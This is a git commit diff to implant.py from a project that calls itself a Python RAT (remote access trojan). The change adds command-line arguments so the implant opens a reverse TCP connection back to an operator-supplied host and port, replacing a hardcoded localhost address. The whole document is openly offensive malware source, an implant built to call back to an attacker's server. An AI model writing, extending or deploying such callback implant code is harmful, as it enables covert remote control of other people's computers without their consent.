7eb53967c55685daa7a5289795973fbf382d3066
Hans Hoffman <hdot@GreenCouch.local>
2016-03-29 22:29:05 -0400

    added command line args

--- implant.py
+++ implant.py
@@ -1,14 +1,33 @@
-# from crispy.controller import CrispyController
-# from crispy.crypto.mime import Mime
-# 
-# if __name__ == "__main__":
-#     cc = CrispyController("localhost", 8080, Mime())
-#     cc.run()
+import argparse
 
 from crispy.network.client_types import CrispyTCPClient
 
+def main():
+    argp = argparse.ArgumentParser(description="Starts a reverse connection to either the crispy-fortnight \
+						(Python RAT) daemon or a proxy server.",
+                                   prog="implant")
+    argp.add_argument("--host",
+                        dest="host",
+                        help="Host to connect back to",
+                        metavar="<ip_addr>",
+                        required=True,
+                        type=str)    
+    argp.add_argument("--port",
+                        dest="port",
+                        help="Port on host to bind to",
+                        metavar="<port>",
+                        required=True,
+                        type=int)
+    args = argp.parse_args()
+
+    try:
+	sock = CrispyTCPClient().connect(args.host, args.port)
+	while True:
+	    pass
+    except KeyboardInterrupt:
+	pass
+    except Exception:
+	print "[!] Error connecting to {}:{}".format(args.host, args.port)
+
 if __name__ == "__main__":
-    HOST, PORT = "localhost", 8080
-    
-    sock = CrispyTCPClient().connect(HOST, PORT)
-    print sock.recv(1024)
+    main()
